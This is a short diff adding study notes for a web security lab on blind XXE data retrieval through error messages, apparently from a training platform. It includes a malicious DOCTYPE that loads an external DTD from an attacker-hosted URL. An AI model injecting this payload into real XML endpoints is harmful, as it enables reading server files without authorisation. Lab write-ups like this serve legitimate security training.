@@ -42,3 +42,9 @@
 
 
 ---------------------------------------------------------------------------------------------------- 
+
+#6 Lab: Exploiting blind XXE to retrieve data via error messages
+
+     1. Check stock and send the request to repeater.
+     2. Go to exploit server and paste the payload from the lab
+     3. Add <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]> after xml line
